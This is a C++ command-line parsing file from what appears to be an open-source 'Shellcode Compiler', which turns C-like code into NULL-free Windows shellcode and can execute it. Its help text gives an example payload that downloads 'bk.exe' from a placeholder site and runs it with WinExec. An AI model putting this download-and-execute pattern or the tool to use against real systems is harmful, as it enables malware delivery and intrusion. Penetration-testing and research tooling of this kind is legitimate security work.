
#include "CommandLine.h"

// Program version

#define PROGRAM_VERSION "v0.2 Alpha"

// Global variable for command line arguments

bool CommandLine::g_bHelp = false;
bool CommandLine::g_bVerbose = false;
bool CommandLine::g_bTest = false;
bool CommandLine::bError = false;

bool CommandLine::g_bPlatform = false;
string CommandLine::g_sPlatform = "";
PLATFORM_TYPE CommandLine::g_ePlatform = PLATFORM_TYPE_WINDOWS_X86;

bool   CommandLine::g_bReadFile = false;
string CommandLine::g_sReadFile = "";
bool   CommandLine::g_bOutputFile = false;
string CommandLine::g_sOutputFile = "";
bool   CommandLine::g_bASMFile = false;
string CommandLine::g_sASMFile = "";

// Print help

void CommandLine::PrintHelp(string p_sFile)
{
	cout << endl;
	cout << "Shellcode Compiler " << PROGRAM_VERSION << endl;
	cout << "Ionut Popescu [ NytroRST ]" << endl;
	cout << "NytroSecurity [ nytrosecurity.com ]" << endl << endl;

	cout << "Program description" << endl;
	cout << "-------------------" << endl;
	cout << "\tShellcode Compiler is a program that compiles C/C++ style code " << endl;
	cout << "into a small, position-independent and NULL-free shellcode for Windows." << endl;
	cout << "It is possible to call any Windows API function in a user-friendly way." << endl << endl;

	cout << "Command line options " << endl;
	cout << "--------------------" << endl;
	cout << "\t-h (--help)      : Show this help message" << endl;
	cout << "\t-p (--platform)  : Shellcode platform: win_x86,win_x64,linux_x86,linux_x64" << endl;
	cout << "\t-v (--verbose)   : Print detailed output" << endl;
	cout << "\t-t (--test)      : Test (execute) generated shellcode" << endl;
	cout << "\t-r (--read)      : Read source code file" << endl;
	cout << "\t-o (--output)    : Output file of the generated binary shellcode" << endl;
	cout << "\t-a (--assembbly) : Output file of the generated assembly code" << endl << endl;

	cout << "Source code example" << endl;
	cout << "-------------------" << endl << endl;
	cout << "\tfunction URLDownloadToFileA(\"urlmon.dll\");" << endl;
	cout << "\tfunction WinExec(\"kernel32.dll\");" << endl;
	cout << "\tfunction ExitProcess(\"kernel32.dll\");" << endl << endl;
	cout << "\tURLDownloadToFileA(0,\"https://site.com/bk.exe\",\"bk.exe\",0,0);" << endl;
	cout << "\tWinExec(\"bk.exe\",0);" << endl;
	cout << "\tExitProcess(0);" << endl << endl;

	cout << "Invocation example" << endl;
	cout << "------------------" << endl;
	cout << "\t" << p_sFile << " -r Source.txt -o Shellcode.bin -a Assembly.asm" << endl;
}

// Parse command line arguments

void CommandLine::ParseCommandLine(int argc, char *argv[])
{
	string CurrentParam;
	string NextParam;

	// Check arguments

	for (int i = 1; i < argc; i++)
	{
		CurrentParam = argv[i];
		if (i + 1 < argc) NextParam = argv[i + 1];
		else NextParam = "";

		// Check options

		if (CurrentParam.compare("-h") == 0 || CurrentParam.compare("--help") == 0)         g_bHelp = true;
		else if (CurrentParam.compare("-v") == 0 || CurrentParam.compare("--verbose") == 0) g_bVerbose = true;
		else if (CurrentParam.compare("-t") == 0 || CurrentParam.compare("--test") == 0)    g_bTest = true;

		// Arguments that require an option as a second argument

		else if (CurrentParam.compare("-r") == 0 || CurrentParam.compare("--read") == 0)
		{
			g_bReadFile = true;
			if (NextParam.length() > 0) g_sReadFile = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -r argument" << endl;
			}
		}
		else if (CurrentParam.compare("-p") == 0 || CurrentParam.compare("--platform") == 0)
		{
			g_bPlatform = true;
			if (NextParam.length() > 0) g_sPlatform = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -p argument" << endl;
			}
		}
		else if (CurrentParam.compare("-o") == 0 || CurrentParam.compare("--output") == 0)
		{
			g_bOutputFile = true;
			if (NextParam.length() > 0) g_sOutputFile = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -o argument" << endl;
			}
		}
		else if (CurrentParam.compare("-a") == 0 || CurrentParam.compare("--assembly") == 0)
		{
			g_bASMFile = true;
			if (NextParam.length() > 0) g_sASMFile = NextParam;
			else
			{
				bError = true;
				cout << endl << "Missing required value for -a argument" << endl;
			}
		}
	}

	// Check for errors

	if (bError == true)
	{
		cout << "Cannot compile, check command line arguments!" << endl;
		return;
	}

	// Help

	if (g_bHelp)
	{
		PrintHelp(argv[0]);
		return;
	}

	// Set platform

	if (g_bPlatform)
	{
		Platform::SetPlatformString(g_sPlatform);
		cout << endl << "Target platform: " << Platform::GetPlatformString() << endl;
	}

	// Parse source file

	if (g_bReadFile)
		Compile::ParseFile(Utils::ReadSourceFile(g_sReadFile));
	else
	{
		cout << "You must specify a source code file!" << endl;
		return;
	}

	// Output data from verbose mode

	if (g_bVerbose) DebugUtils::DumpAllData();

	// Output ASM file

	if (g_bASMFile)
	{
		if (Utils::FileExists(g_sASMFile)) Utils::DeleteSourceFile(g_sASMFile);
		Compile::CompileAllData(g_sASMFile);
	}
	else
	{
		string sFile = Utils::GetTemp();
		sFile += "\\SC.asm";
		g_sASMFile = sFile;
		if (Utils::FileExists(g_sASMFile)) Utils::DeleteSourceFile(g_sASMFile);
		Compile::CompileAllData(sFile);
	}

	// Output file

	if (!g_bOutputFile)
		g_sOutputFile = "SC2.bin";

	if (Utils::FileExists(g_sOutputFile)) Utils::DeleteSourceFile(g_sOutputFile);

	// Compile using Keystone engine

	size_t nAssembledSize = 0;
	unsigned char *pcAssembled = KeystoneLib::Assemble(&nAssembledSize, Utils::ReadSourceFile(g_sASMFile));

	if (nAssembledSize == 0)
	{
		cout << "ERROR: Cannot compile the code!" << endl;
		return;
	}

	// Write output to file

	size_t nResult = Utils::WriteBinaryFile(g_sOutputFile, pcAssembled, nAssembledSize);

	if (nResult == 0)
	{
		cout << "ERROR: Cannot write the compiled shellcode to file!" << endl;
		return;
	}

	// Test shellcode

	if (g_bTest)
	{
		cout << endl << "Testing shellcode..." << endl;
		Sleep(3000);
		DebugUtils::TestShellcode(g_sOutputFile);
	}
}
